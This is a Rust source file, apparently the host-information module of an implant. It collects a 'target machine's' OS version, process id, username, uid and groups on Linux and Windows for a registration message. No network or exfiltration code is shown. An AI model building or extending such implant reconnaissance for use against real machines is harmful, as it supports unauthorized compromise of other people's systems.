// Get info about the target machine
use crate::pb::registration::User;
use anyhow::{Context, Result, Ok};
use sysinfo::{PidExt, SystemExt, UserExt, RefreshKind};

pub struct Info {
    system: sysinfo::System,
    username: String
}

// Macro to get the current user
macro_rules! current_user {
    ($self:ident) => {
        $self.system.users()
            .iter()
            .find(|u| u.name() == $self.username)
            .context(0)
    };
}

impl Info {
    pub fn new() -> Info {
        Info {
            system: sysinfo::System::new_with_specifics(RefreshKind::new().with_users_list()),
            username: whoami::username()
        }
    }

    // Get the current operating system name by parsing /etc/os-release
    pub fn os(&self) -> Result<String> {
        Ok(self.system.long_os_version().context(0)?)
    }

    // TODO: Get the current process id of the running implant
    pub fn pid(&self) -> Result<u32> {
        Ok(sysinfo::get_current_pid().ok().context(0)?.as_u32())
    }

    // Get the user running the implant
    pub fn user(&self) -> Result<User> {
        let current_user = self.system.users()
            .iter()
            .find(|u| u.name() == self.username)
            .context(0)?;

        let u = User {
            id: self.get_id()?,
            name: current_user.name().to_string(),
        };

        Ok(u)
    }

    fn get_id(&self) -> Result<u32> {
        Ok(current_user!(self)?
         .id()
         .to_string()
         .parse()
         .unwrap_or_else(|_| u32::MAX))
    }

    #[cfg(target_os = "linux")]
    pub fn groups(&self) -> Result<Vec<User>> {
        let g = User {
            id: users::get_current_gid(),
            name: users::get_current_groupname()
                .context(0)?
                .into_string()
                .ok()
                .context(0)?,
        };
        Ok(vec![g])
    }

    #[cfg(target_os = "windows")]
    pub fn groups(&self) -> Result<Vec<User>> {
        let g = current_user!(self)?
            .groups()
            .iter()
            .map(|groupname| User {
                id: 0,
                name: groupname.to_string()
            })
            .collect();

        Ok(g)
    }
}

